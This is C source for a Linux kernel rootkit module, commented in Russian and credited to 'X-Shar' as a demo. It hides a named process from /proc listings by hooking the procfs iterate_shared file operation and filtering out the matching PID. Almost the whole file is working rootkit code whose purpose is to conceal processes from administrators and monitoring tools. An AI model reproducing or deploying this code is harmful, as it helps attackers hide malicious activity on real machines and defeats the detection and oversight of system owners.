/*
 * proc_hide.c
 *
 * Модуль руткита, который скрывает процесс, по его имени.
 *
 * По умолчанию имя процесса, которого нужно скрыть расположена в константе HIDE_PROC
 * в заголовочном файле example_config.h
 *
 */

#include "headers.h"

static struct file_operations proc_fops;
static struct file_operations *backup_proc_fops;
static struct inode *proc_inode;
static struct path p;

static struct dir_context *backup_ctx;

//Макросы для работы с процессами

extern struct task_struct init_task;
#define next_task(p) list_entry((p)->tasks.next, struct task_struct, tasks)
#define for_each_process(p) for (p = &init_task ; (p = next_task(p)) != &init_task ; )


//Функция перевода строки в число
static int char_to_int(const char *s)
{
	int n;
	unsigned char sign = 0;

	while (isspace(*s))
	{
		s++;
	}

	if (*s == '-')
	{
		sign = 1;
		s++;
	}
	else if (*s == '+')
	{
		s++;
	}

	n=0;

	while (isdigit(*s))
	{
		n = n * 10 + *s++ - '0';
	}

	return sign ? -n : n;
}

//Функция ищет идентификатор процесса по его имени, если он есть
static int get_my_pid(char *proc_name)
{
	struct task_struct *task;

	for_each_process(task)
	{
		if((strcmp(task->comm, proc_name)==0))
		{
			printk(KERN_INFO "+++ Found Pid: %d\n", task->pid);
			return task->pid;
		}
	}
	return (-1);
}

static int rootkit_filldir(struct dir_context *ctx, const char *proc_name, int len,
		loff_t off, u64 ino, unsigned int d_type)
{

	int pid_to_cmp = char_to_int (proc_name);
	int get_pid = get_my_pid(HIDE_PROC);

	if (pid_to_cmp == get_pid) {
		printk(KERN_INFO "+++ Proc %s succsed hide !\n", HIDE_PROC);
		return 0;
	}

	return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

static struct dir_context rootkit_ctx = {
		.actor = rootkit_filldir,
};

static int rootkit_hook_iterate_shared(struct file *file, struct dir_context *ctx)
{
	int result = 0;
	rootkit_ctx.pos = ctx->pos;
	backup_ctx = ctx;
	result = backup_proc_fops->iterate_shared(file, &rootkit_ctx);
	ctx->pos = rootkit_ctx.pos;

	return result;
}

//Интерфейсная функция инициализации модуля скрытия процессов по имени

int start_rootkit_proc_hide (void)
{

	/* Получить структуру procfs */
	if(kern_path("/proc", 0, &p))
	{
		printk(KERN_INFO "+++ Dont get procfs !\n");
		return (-1);
	}

	/* Получить указатель на inode*/
	proc_inode = p.dentry->d_inode;

	/* Получить указатель на file_operations из inode */
	proc_fops = *proc_inode->i_fop;
	/* Беккапим структуру */
	backup_proc_fops = proc_inode->i_fop;
	/* Модифицируем структуру, что-бы вызывалась наша функция */
	proc_fops.iterate_shared = rootkit_hook_iterate_shared;
	/* Перезаписываем активные файловые операции */
	proc_inode->i_fop = &proc_fops;

	return 0;

}

int stop_rootkit_proc_hide (void)
{
	/* Получить структуру procfs */
	if(kern_path("/proc", 0, &p))
	{
		printk(KERN_INFO "+++ Dont get procfs !\n");
		return (-1);
	}

	proc_inode = p.dentry->d_inode;
	proc_inode->i_fop = backup_proc_fops;

	return 0;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("X-Shar");
MODULE_VERSION("demo");
